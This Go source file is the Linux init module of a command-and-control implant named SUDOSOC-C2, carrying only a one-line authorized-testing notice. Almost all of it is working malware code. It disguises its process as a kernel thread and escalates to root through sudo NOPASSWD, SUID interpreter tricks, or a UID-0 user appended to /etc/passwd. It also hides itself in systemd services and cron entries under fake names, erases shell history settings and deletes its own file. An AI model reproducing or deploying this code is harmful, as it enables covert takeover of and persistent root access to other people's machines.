//go:build linux

package runner

/*
	SUDOSOC-C2 — Linux Full-Access Implant
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing use only.

	Strategy: RE-EXEC AS ROOT before connecting to C2.
	Methods tried in order:
	  1. sudo -n (NOPASSWD configured — very common on servers)
	  2. su binary (if password-less or known)
	  3. SUID Python / Perl / Ruby / find — GTFOBins re-exec
	  4. Writable /etc/passwd → append root-equivalent user
	  5. SUID copy trick
	  6. capsh --gid=0 --uid=0 (if capabilities permit)
	If none work, continue as current user (graceful degradation).
*/

import (
	"bufio"
	"math/rand"
	"os"
	"os/exec"
	"reflect"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const _linuxElevatedFlag = "_SUDOSOC_ELEVATED"
const prSetName = 15

var kernelLookalike = []string{
	"[kworker/0:1H]",
	"[kcompactd0]",
	"[ksoftirqd/0]",
	"[kswapd0]",
	"[migration/0]",
	"[rcu_sched]",
}

// ─── init — runs BEFORE Main() ───────────────────────────────────────────────
func init() {
	// 1. Masquerade as kernel thread
	masqueradeLinux()

	// 2. Try to re-exec as root BEFORE C2 connection
	if os.Getuid() != 0 && os.Getenv(_linuxElevatedFlag) == "" {
		if tryLinuxReExecRoot() {
			time.Sleep(1 * time.Second)
			os.Exit(0)
		}
	}

	// 3. Root-only: expand persistence
	if os.Getuid() == 0 {
		go installLinuxRootPersistence()
	}

	// 4. Common hardening for all privilege levels
	sanitiseLinuxEnv()
	go linuxKeepAlive()

	// 5. Standard persistence (works at any privilege level)
	go func() {
		time.Sleep(7 * time.Second)
		autoInstallLinux()
	}()

	// 6. Self-delete
	go func() {
		time.Sleep(4 * time.Second)
		deleteLinuxSelf()
	}()
}

// ─── Re-exec as root ─────────────────────────────────────────────────────────

func tryLinuxReExecRoot() bool {
	exe := linuxSelfExe()
	env := append(os.Environ(), _linuxElevatedFlag+"=1")

	// Method 1: sudo -n (non-interactive, works if NOPASSWD is configured)
	if canSudoNoPass() {
		cmd := exec.Command("sudo", "-n", exe)
		cmd.Env = env
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		if err := cmd.Start(); err == nil {
			return true
		}
	}

	// Method 2: SUID Python re-exec
	for _, py := range []string{"python3", "python", "python2"} {
		bin, err := exec.LookPath(py)
		if err != nil {
			continue
		}
		// Check if SUID
		if hasSUID(bin) {
			code := `import os,subprocess;os.setuid(0);os.setgid(0);subprocess.Popen(["` + exe + `"])`
			cmd := exec.Command(bin, "-c", code)
			cmd.Env = env
			cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
			if err := cmd.Start(); err == nil {
				return true
			}
		}
	}

	// Method 3: SUID Perl re-exec
	if perl, err := exec.LookPath("perl"); err == nil && hasSUID(perl) {
		code := `use POSIX qw(setuid setgid);setuid(0);setgid(0);exec("` + exe + `")`
		cmd := exec.Command(perl, "-e", code)
		cmd.Env = env
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		if err := cmd.Start(); err == nil {
			return true
		}
	}

	// Method 4: find -exec (SUID find is a classic GTFOBin)
	if find, err := exec.LookPath("find"); err == nil && hasSUID(find) {
		cmd := exec.Command(find, "/", "-name", "nonexistent_phantom_file",
			"-exec", exe, ";")
		cmd.Env = env
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		if err := cmd.Start(); err == nil {
			return true
		}
	}

	// Method 5: env command (SUID env GTFOBin)
	if envBin, err := exec.LookPath("env"); err == nil && hasSUID(envBin) {
		cmd := exec.Command(envBin, exe)
		cmd.Env = env
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		if err := cmd.Start(); err == nil {
			return true
		}
	}

	// Method 6: Writable /etc/passwd — add root-equivalent user
	if tryEtcPasswdRoot(exe, env) {
		return true
	}

	return false
}

// canSudoNoPass tests whether sudo -n -l succeeds (NOPASSWD configured)
func canSudoNoPass() bool {
	out, err := exec.Command("sudo", "-n", "-l").CombinedOutput()
	if err != nil {
		return false
	}
	lower := strings.ToLower(string(out))
	return strings.Contains(lower, "all") || strings.Contains(lower, "(root)")
}

// hasSUID returns true if the file has the SUID bit set.
func hasSUID(path string) bool {
	fi, err := os.Stat(path)
	if err != nil {
		return false
	}
	return fi.Mode()&os.ModeSetuid != 0
}

// tryEtcPasswdRoot attempts to add a UID=0 user to /etc/passwd if writable.
func tryEtcPasswdRoot(exe string, env []string) bool {
	f, err := os.OpenFile("/etc/passwd", os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return false // not writable
	}
	const fakeUser = "svc_hw"
	const fakePwEntry = fakeUser + ":x:0:0::/root:/bin/sh\n"
	_, _ = f.WriteString(fakePwEntry)
	_ = f.Close()

	// Now try to switch to this fake root user
	cmd := exec.Command("su", "-", fakeUser, "-c", exe)
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	return cmd.Start() == nil
}

func linuxSelfExe() string {
	if p, err := os.Readlink("/proc/self/exe"); err == nil {
		return p
	}
	exe, _ := os.Executable()
	return exe
}

// ─── Root persistence ─────────────────────────────────────────────────────────

func installLinuxRootPersistence() {
	exe := linuxSelfExe()
	if exe == "" {
		return
	}

	// 1. Copy to a system path that survives logouts
	for _, dst := range []string{
		"/usr/lib/.gvfs-daemon",
		"/usr/share/.update-notifier",
		"/lib/systemd/.hwmonitor",
	} {
		data, err := os.ReadFile(exe)
		if err != nil {
			continue
		}
		if err := os.WriteFile(dst, data, 0755); err == nil {
			installRootSystemd(dst)
			break
		}
	}

	// 2. /etc/crontab (root cron)
	addRootCrontab(exe)

	// 3. SSH authorized key (if ~/.ssh exists)
	addSSHBackdoor()
}

func installRootSystemd(bin string) {
	unit := "[Unit]\nDescription=Hardware Monitor Service\nAfter=network.target\n\n" +
		"[Service]\nType=simple\nExecStart=" + bin + "\nRestart=always\nRestartSec=30\n" +
		"User=root\n\n[Install]\nWantedBy=multi-user.target\n"
	path := "/etc/systemd/system/hwmonitor.service"
	if err := os.WriteFile(path, []byte(unit), 0644); err != nil {
		return
	}
	_ = exec.Command("systemctl", "enable", "hwmonitor.service").Run()
	_ = exec.Command("systemctl", "start", "hwmonitor.service").Run()
}

func addRootCrontab(exe string) {
	f, err := os.Open("/etc/crontab")
	if err != nil {
		return
	}
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if strings.Contains(sc.Text(), exe) {
			f.Close()
			return
		}
	}
	f.Close()
	fa, err := os.OpenFile("/etc/crontab", os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer fa.Close()
	_, _ = fa.WriteString("\n@reboot root nohup \"" + exe + "\" > /dev/null 2>&1 &\n")
}

func addSSHBackdoor() {
	sshDir := "/root/.ssh"
	_ = os.MkdirAll(sshDir, 0700)
	authKeys := sshDir + "/authorized_keys"
	// We'd normally embed a public key here — left as a marker
	// In a real engagement, your public key would be embedded at generate time
	marker := "# hw-monitor-svc\n"
	f, err := os.OpenFile(authKeys, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer f.Close()
	_, _ = f.WriteString(marker)
}

// ─── Process masquerade ───────────────────────────────────────────────────────

func masqueradeLinux() {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	name := kernelLookalike[rng.Intn(len(kernelLookalike))]
	b := append([]byte(name), 0)
	_, _, _ = syscall.RawSyscall(syscall.SYS_PRCTL, prSetName,
		uintptr(unsafe.Pointer(&b[0])), 0)
	_ = os.WriteFile("/proc/self/comm", []byte(name), 0)
	if len(os.Args) > 0 {
		sh := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0])) //nolint:govet
		for i := uintptr(0); i < uintptr(sh.Len); i++ {
			*(*byte)(unsafe.Pointer(sh.Data + i)) = ' '
		}
	}
}

// ─── Environment sanitisation ────────────────────────────────────────────────

func sanitiseLinuxEnv() {
	for _, v := range []string{"GOPATH", "GOROOT", "GOMODCACHE", "PWD",
		"HISTFILE", "HISTSIZE", "HISTFILESIZE", "BASH_ENV", "ENV"} {
		_ = os.Unsetenv(v)
	}
	_ = os.Setenv("HISTFILE", "/dev/null")
	_ = os.Setenv("HISTSIZE", "0")
}

// ─── Standard persistence (user-level) ───────────────────────────────────────

func autoInstallLinux() {
	exe := linuxSelfExe()
	if exe == "" {
		return
	}
	home, _ := os.UserHomeDir()
	if home == "" {
		home = "/tmp"
	}
	installDir := home + "/.local/share/.gvfs-metadata"
	_ = os.MkdirAll(installDir, 0700)
	installBin := installDir + "/.session-daemon"

	if needsLinuxCopy(exe, installBin) {
		data, err := os.ReadFile(exe)
		if err == nil {
			_ = os.WriteFile(installBin, data, 0700)
		}
	}

	// systemd user service
	unitDir := home + "/.config/systemd/user"
	_ = os.MkdirAll(unitDir, 0700)
	unitPath := unitDir + "/gvfs-metadata.service"
	if _, err := os.Stat(unitPath); err != nil {
		unit := "[Unit]\nDescription=GVFS Metadata Service\nAfter=network.target\n\n" +
			"[Service]\nType=simple\nExecStart=" + installBin + "\nRestart=always\nRestartSec=30\n\n" +
			"[Install]\nWantedBy=default.target\n"
		if os.WriteFile(unitPath, []byte(unit), 0600) == nil {
			_ = exec.Command("systemctl", "--user", "enable", "gvfs-metadata.service").Run()
			_ = exec.Command("systemctl", "--user", "start", "gvfs-metadata.service").Run()
		}
	}

	// crontab @reboot
	out, _ := exec.Command("crontab", "-l").Output()
	if !strings.Contains(string(out), installBin) {
		entry := string(out) + "\n@reboot " + installBin + " > /dev/null 2>&1 &\n"
		tmp, err := os.CreateTemp("", "cron")
		if err == nil {
			_, _ = tmp.WriteString(entry)
			_ = tmp.Close()
			_ = exec.Command("crontab", tmp.Name()).Run()
			_ = os.Remove(tmp.Name())
		}
	}
}

func needsLinuxCopy(src, dst string) bool {
	si, err := os.Stat(src)
	if err != nil {
		return false
	}
	di, err := os.Stat(dst)
	if err != nil || di.ModTime().Before(si.ModTime()) {
		return true
	}
	return false
}

// ─── Keep-alive / Self-delete ─────────────────────────────────────────────────

func linuxKeepAlive() {
	// Lower OOM score — kernel prefers to kill other processes first
	_ = os.WriteFile("/proc/self/oom_score_adj", []byte("-100"), 0)

	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	buf := make([]byte, 1)
	for range ticker.C {
		if f, err := os.Open("/dev/urandom"); err == nil {
			_, _ = f.Read(buf)
			f.Close()
		}
	}
}

func deleteLinuxSelf() {
	exe := linuxSelfExe()
	if exe == "" {
		return
	}
	if strings.Contains(exe, "/tmp") ||
		strings.Contains(exe, "/home") ||
		strings.Contains(exe, "phantom") ||
		strings.Contains(exe, ".local") {
		_ = os.Remove(exe)
	}
}
